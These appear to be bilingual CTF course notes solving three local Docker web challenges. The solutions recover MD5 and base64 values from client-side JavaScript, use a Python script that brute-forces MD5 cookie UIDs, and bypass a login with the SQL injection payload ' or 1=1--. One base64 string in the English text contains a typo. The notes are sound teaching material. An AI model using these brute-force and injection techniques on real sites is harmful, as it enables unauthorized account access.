To run these challenges, you need to install & use [Docker](obsidian://open?vault=Default&file=GitHub%20Uploads%2FCyberSecurity_UNIPD%2FCTFs_Software%2FDocker)
## Challenge 8.1 - AjaxNotBorax (MD5 Encrypted Ajax)

[For Linux System]

Again you need to delete the line into the Dockerfile:
```
RUN apt-get update --fix-missing
```

#### Description :
```
http://127.0.0.1:8083/

(use ./docker_run.sh to run the server locally)

Rules: you cannot access the 'web' folder, but you can use online tools.
```
IT: Stessa situazione del primo esercizio sezione 7, come ricorda anche il titolo. E come da messaggio sul sito, questa volta è stata usata l'encryption. Guardando JS, e comparandolo con quello dell'esercizio 7.1, l'unica differenza è nella riga, rispettivamente:

ENG: Same situation as in the first exercise section 7, as the title also reminds. And as per the message on the website, encryption was used this time. Looking at JS, and comparing it with that of exercise 7.1, the only difference is in the line, respectively:

```
Funzione Username:  if(data==MD5(that.val()))
Funzione Password:  if(MD5(data)==MD5(that.val()))
```

#### Solution :

IT: -----------------------------------------------------------------------------------------------------
La funzione di encrypt (MD5) è fornita in un .js esterno.

Provo ad eseguire gli stessi passi dell'altro esercizio

Sono riuscito ad estrapolare `c5644ca91d1307779ed493c4dedfdcb7` dall'username, e usando un semplice MD5 Decrypter, sono riuscito a decriptare l'username: tideade

Ora che conosco l'username, posso provare ed eseguire la medesima operazione sulla funzione password.

Trovo `ZmxhZ3tzZDkwSjBkbkxLSjFsczlISmVkfQ==`

Sembra che prima di fare decrypt bisogna convertirla dalla base64, ma una volta decodata, ci viene rivelata 
la Flag = flag{sd90J0dnLKJ1ls9HJed}

ENG: -----------------------------------------------------------------------------------------------------

The encrypt (MD5) function is provided in an external .js.  
  
I try to perform the same steps as in the other exercise.  
  
I managed to extract `c5644ca91d1307779ed493c4dedfdcb7` from the username, and using a simple MD5 Decrypter, I was able to decrypt the username: tideade  
  
Now that I know the username, I can try and perform the same operation on the password function.  
  
I find `ZmxhZ3tzZDkwSjBkbxLSjFsczlISmVkfQ==`  

It appears that before doing decrypt we need to convert it from base64, but once decoded, we are revealed to have the Flag = flag{sd90J0dnLKJ1ls9HJed}

-----------------------------------------------------------------------------------

## Challenge 8.2 - Sweeeeeeeeeet (Cookie UID Bruteforce)

[For Linux System]

In this exercise we will need to use the command:
```
sudo docker-compose up
```

If you do not have docker-compose installed:
```
sudo apt install docker-compose
```

#### Description :
```
When you see a docker-compose file, use the following command to run the exercise:

	sudo docker-compose up

If your machine does not provide docker-compose, you can install it by following this guide:
https://docs.docker.com/compose/install/

To solve the exercise, you need first to inspect the app with the browser’s debugger, and then, once you understood what you need to solve it, we suggest you write a Python script.

Some useful Python libraries:

import hashlib
import codecs
import numpy as np
import requests

A request example:

#IP
ip = "127.0.0.1"
port= "8080"

#we first check that our MD5 works by comparing Md5(100) with
#the one in the webpage
control = "f899139df5e1059396431415e770c6dd"
tester = 100
tester_b = str.encode(str(tester))
tester_md5 = hashlib.md5(tester_b).hexdigest()
print(f"tester={tester_md5 == control}")
```

#### Solution :

IT: Stessa situazione del secondo esercizio sezione 7, ma bisogna lavorarci su con Python. Guardando tra i cookies, ne troviamo 2:

ENG: Same situation as the second exercise section 7, but you have to work on it with Python. Looking through the cookies, we find 2 of them:

```
FLAG:"encryptCTF%7By0u_c4nt_U53_m3%7D"
UID:"f899139df5e1059396431415e770c6dd"
```

IT: -----------------------------------------------------------------------------------------------------

La flag è incompleta

Se proviamo a decryptare tramite MD5 l'UID, abbiamo come risultato 100.

Siccome non rimane molto altro da poter fare, bisogna pensare ad un modo per eseguire bruteforce provando diversi numeri/UID in MD5 (siccome MD5(f899139df5e1059396431415e770c6dd) == 100)

ENG: ----------------------------------------------------------------------------------------------------

The flag is incomplete

If we try to decrypt via MD5 the UID, we get 100 as the result.

Since there is not much else left to do, we have to think of a way to bruteforce by trying different numbers/UIDs in MD5 (since MD5(f899139df5e1059396431415e770c6dd) == 100)

Python script (cookie_bruteforce)
```Python
import hashlib
import codecs
import numpy as np
import requests

#IP
ip = "127.0.0.1"
port= "8080"

#we first check that our MD5 works by comparing Md5(100) with
#the one in the webpage
control = "f899139df5e1059396431415e770c6dd"
tester = 100
tester_b = str.encode(str(tester))
tester_md5 = hashlib.md5(tester_b).hexdigest()
print(f"tester={tester_md5 == control}")

#try a request to the web application
cookies = {"UID":tester_md5}
r = requests.post(f"http://{ip}:{port}", cookies = cookies)
def_flag = r.cookies["FLAG"] #default flag

print(f"default flag\t{def_flag}")

#brute force cycle
for i in range(100):
    """ compute the MD5 """
    #convert the number to a byte
    byte_i = str.encode(str(i))

    #obtain the MD5
    md5_i = hashlib.md5(byte_i).hexdigest()

    #     """ Send request to the web application """
    #set the cookie
    cookies = {'UID': str(md5_i)}
    r = requests.post(f"http://{ip}:{port}", cookies = cookies)

    #get the i-th flag
    flag_i = r.cookies["FLAG"]

    #if the content of the cookie is different to the 100th one, we have the flag
    if flag_i != def_flag:
        print(f"FLAG found at iteration={i}\t{flag_i}")
        break
```

-----------------------------------------------------------------------------------

## Challenge 8.3 - Vault  (Introduction to SQL Injection)

[For Linux System]
#### Description :
```
You don't have access to any file.
The challenge can be resolved only browser side.

To lunch the app, run the following
- docker-compose up
```
We can open the site at: 127.0.0.1:9090

#### Solution :

It should be SQL Injection, if we try to enter:
```
Username: ' or 1=1--
Password: ' or 1=1--
```

IT: Una volta che abbiamo avuto accesso, saremmo accolti da un QR Code, che è meglio NON leggere. Se guardiamo nei cookie, notiamo la presenza di un nuovo cookie:

Once we were logged in, we would be greeted by a QR Code, which is best NOT to open. If we look in the cookies, we notice the presence of a new cookie:
```
SESSIONID:"ZW5jcnlwdENURntpX0g0dDNfaW5KM2M3aTBuNX0%3D"
```
IT: Sembra proprio un Hash. Possiamo usare un [Hash Cracker Online](https://hashes.com/en/decrypt/hash):

ENG: That's an Hash. We can decrypt it using an [Online Hash Cracker](https://hashes.com/en/decrypt/hash): 

We'll be rewarded with the flag = encryptCTF{i_H4t3_inJ3c7i0n5}

IT: -----------------------------------------------------------------------------------------------------

Se sbagliamo ad inserire un input, ci darà come risposta un FATAL ERROR SQL =  "Uncaught mysqli_sql_exception"

ENG: ----------------------------------------------------------------------------------------------------

If we make a mistake in entering an input, it will give us a FATAL ERROR SQL response = "Uncaught mysqli_sql_exception"


Next => WEB Part_3 TODO

Previous => [WEB Part_1 - Ajax - Console - Cookies(Privilege escalation)](<obsidian://open?vault=Default&file=GitHub%20Uploads%2FCyberSecurity_UNIPD%2FWEB_Challenges%2FWEB%20Part_1%20-%20Ajax%20-%20Console%20-%20Cookies(Privilege%20escalation)>)

